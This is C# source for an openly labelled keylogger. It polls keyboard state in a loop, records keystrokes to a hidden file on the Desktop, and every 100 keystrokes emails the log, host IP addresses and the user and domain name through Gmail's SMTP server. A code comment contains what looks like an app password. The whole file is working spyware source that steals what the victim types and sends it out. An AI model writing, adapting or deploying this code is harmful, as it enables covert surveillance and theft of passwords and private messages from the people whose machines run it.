using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static long numofkeystrokes = 0;
        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if(!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\keystrokes.txt");
            if(!File.Exists(path))
            {
                using(StreamWriter sw = new StreamWriter(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

            while(true)
            {
                Thread.Sleep(5);
                for(int i = 32;i <= 127;i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        Console.Write((char)i);

                        using(StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        numofkeystrokes++;
                        if (numofkeystrokes % 100 == 0)
                        {
                            SendMessage();
                        }
                    }
                }
            }
        }
        static void SendMessage()
        {
            String folderpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filepath = (folderpath + @"\keystrokes.txt");

            String logContents = File.ReadAllText(filepath);

            string emailBody = "";

            // create an email message

            DateTime now = DateTime.Now;    //call date
            string subject = "Message from keylogger ";    //email subject
            subject += now;

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;

            }
            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);      //587 is gmail's port
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("email");
            mailMessage.To.Add("email");
            mailMessage.Subject = subject;

            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("email", "password");        // pwvmyrymilqsjzkv--app password

           
            mailMessage.Body = emailBody;
            client.Send(mailMessage);

            mailMessage = null;
        }
    }
}